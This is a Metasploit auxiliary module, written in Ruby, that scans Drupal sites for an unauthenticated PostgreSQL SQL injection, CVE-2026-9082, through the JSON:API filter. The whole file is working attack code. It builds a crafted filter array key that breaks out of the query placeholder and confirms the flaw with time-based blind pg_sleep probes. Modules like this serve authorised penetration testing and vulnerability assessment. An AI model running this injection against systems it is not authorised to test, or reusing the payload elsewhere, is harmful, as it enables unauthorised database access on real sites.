# frozen_string_literal: true

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report
  include Msf::Exploit::SQLi

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Drupal Core PostgreSQL EntityQuery SQL Injection',
        'Description' => %q{
          This module detects CVE-2026-9082, an unauthenticated SQL injection in
          Drupal core's PostgreSQL EntityQuery condition handler. It uses a crafted
          JSON:API filter array key to confirm the vulnerability with time-based
          blind SQL injection. MySQL, MariaDB, and SQLite are not affected.

          The configured JSON:API resource must be anonymously readable and expose
          at least one entity with a case-insensitive string field.
        },
        'Author' => ['Lukas Johannes Moeller'],
        'References' => [
          ['CVE', '2026-9082'],
          ['URL', 'https://www.drupal.org/sa-core-2026-004'],
          ['URL', 'https://github.com/7h30th3r0n3/CVE-2026-9082-Drupal-PoC']
        ],
        'DisclosureDate' => '2026-05-20',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options(
      [
        OptString.new('JSONAPI_RESOURCE', [true, 'An anonymously readable JSON:API resource as entity_type/bundle', 'node/article']),
        OptString.new('JSONAPI_FIELD', [true, 'A case-insensitive string field to filter on', 'title'])
      ]
    )

    register_advanced_options(
      [
        OptFloat.new('SqliDelay', [false, 'Seconds to pg_sleep for each time-based probe', 3.0])
      ]
    )
  end

  def jsonapi_uri
    normalize_uri(target_uri.path, 'jsonapi', datastore['JSONAPI_RESOURCE'])
  end

  def filter_vars(injection_key = nil)
    nonce = Rex::Text.rand_text_alphanumeric(8)
    vars = {
      'filter[sqli][condition][path]' => datastore['JSONAPI_FIELD'],
      'filter[sqli][condition][operator]' => 'IN',
      'filter[sqli][condition][value][0]' => "CVE20269082a-#{nonce}",
      'filter[sqli][condition][value][1]' => "CVE20269082b-#{nonce}"
    }
    vars["filter[sqli][condition][value][#{injection_key}]"] = "CVE20269082c-#{nonce}" if injection_key
    vars
  end

  # Breaks out of the PDO placeholder name at the first ')'.
  def injection_key(payload)
    "1))/**/OR/**/(#{payload})::text=((chr(49)"
  end

  def create_drupal_sqli
    create_sqli(dbms: PostgreSQLi::TimeBasedBlind) do |payload|
      res = send_request_cgi(
        { 'method' => 'GET', 'uri' => jsonapi_uri, 'vars_get' => filter_vars(injection_key(payload)) },
        (datastore['SqliDelay'] + 20).ceil
      )
      raise Rex::ConnectionError, 'No response to the SQL injection probe' unless res
      raise Rex::ConnectionError, "HTTP #{res.code} from the SQL injection probe" if [408, 502, 503, 504].include?(res.code)

      res
    end
  end

  def check_host(ip)
    baseline = send_request_cgi('method' => 'GET', 'uri' => jsonapi_uri)
    return Exploit::CheckCode::Unknown('No response to the baseline JSON:API request') unless baseline
    return Exploit::CheckCode::Unknown("#{jsonapi_uri} returned HTTP #{baseline.code}") unless baseline.code == 200

    doc = baseline.get_json_document
    data = doc['data'] if doc.is_a?(Hash)
    return Exploit::CheckCode::Unknown("#{datastore['JSONAPI_RESOURCE']} has no entities") unless data.is_a?(Array) && data.any?

    field_res = send_request_cgi('method' => 'GET', 'uri' => jsonapi_uri, 'vars_get' => filter_vars)
    return Exploit::CheckCode::Unknown('No response while validating JSONAPI_FIELD') unless field_res
    return Exploit::CheckCode::Unknown("JSONAPI_FIELD '#{datastore['JSONAPI_FIELD']}' is not valid for this resource") unless field_res.code == 200

    report_service(host: ip, port: rport, proto: 'tcp', name: ssl ? 'https' : 'http')
    return Exploit::CheckCode::Vulnerable('Time-based blind SQL injection via JSON:API filter array key') if create_drupal_sqli.test_vulnerable

    Exploit::CheckCode::Safe('No time-based SQL injection response detected')
  rescue Rex::ConnectionError => e
    Exploit::CheckCode::Unknown(e.message)
  end

  def run_host(ip)
    code = check_host(ip)
    unless code == Exploit::CheckCode::Vulnerable
      print_status("#{peer} - #{code.message}")
      return
    end

    print_good("#{peer} - #{code.message}")
    report_vuln(
      host: ip,
      port: rport,
      name: name,
      info: code.message,
      refs: references
    )
  end
end
